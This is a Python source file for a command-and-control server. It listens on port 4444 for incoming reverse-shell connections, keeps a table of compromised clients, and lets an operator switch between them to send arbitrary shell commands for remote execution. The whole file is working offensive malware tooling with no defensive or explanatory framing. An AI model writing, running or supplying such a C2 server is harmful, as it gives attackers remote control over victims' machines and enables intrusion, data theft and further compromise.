import socket
import threading
import sys
import time

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 4444
HEARTBEAT_INTERVAL = 10  # Interval in seconds for sending heartbeats

clients = {}

def handle_client(client_socket, addr, client_id):

    def send_heartbeat():
        while client_id in clients:
            try:
                time.sleep(HEARTBEAT_INTERVAL)
                client_socket.send(b"HEARTBEAT")
            except (ConnectionResetError, BrokenPipeError, socket.timeout):
                client_socket.close()
                del clients[client_id]
                break
            except Exception:
                client_socket.close()
                del clients[client_id]
                break

    threading.Thread(target=send_heartbeat, daemon=True).start()

    while True:
        try:
            command = input(f"Shell ({client_id})> ")
            if command.lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                del clients[client_id]
                break
            elif command.lower() == "back":
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            if response != "HEARTBEAT":
                print(f"Received response: {response}")
        except (ConnectionResetError, BrokenPipeError, socket.timeout):
            client_socket.close()
            del clients[client_id]
            break
        except Exception:
            client_socket.close()
            del clients[client_id]
            break

def accept_connections(server_socket):
    while True:
        try:
            client_socket, addr = server_socket.accept()
            client_id = f"{addr[0]}:{addr[1]}"
            if client_id in clients:
                client_socket.close()
            else:
                clients[client_id] = client_socket
                threading.Thread(target=handle_client, args=(client_socket, addr, client_id)).start()
        except Exception:
            break

def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind((LISTEN_IP, LISTEN_PORT))
        server_socket.listen(5)
    except OSError:
        sys.exit(1)

    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
    accept_thread.start()

    while True:
        try:
            command = input("C2> ")
            if command.lower() == "list":
                for client_id in clients:
                    print(client_id)
            elif command.lower().startswith("switch"):
                try:
                    _, client_id = command.split()
                    if client_id in clients:
                        handle_client(clients[client_id], client_id.split(":"), client_id)
                    else:
                        print("Client ID not found")
                except ValueError:
                    print("Usage: switch <client_id>")
            elif command.lower() == "exit":
                for client_id, client_socket in clients.items():
                    client_socket.send(b"exit")
                    client_socket.close()
                server_socket.close()
                break
            elif command.lower() == "help":
                print("Available commands:")
                print("  list     - List all active client connections")
                print("  switch   - Switch to the shell of a specified client")
                print("  back     - Return to the C2 prompt from a client shell")
                print("  exit     - Shut down the C2 server and close all connections")
                print("  help     - Show this help message")
            else:
                print("Unknown command. Type 'help' for a list of available commands.")
        except KeyboardInterrupt:
            for client_id, client_socket in clients.items():
                client_socket.send(b"exit")
                client_socket.close()
            server_socket.close()
            break

if __name__ == "__main__":
    main()
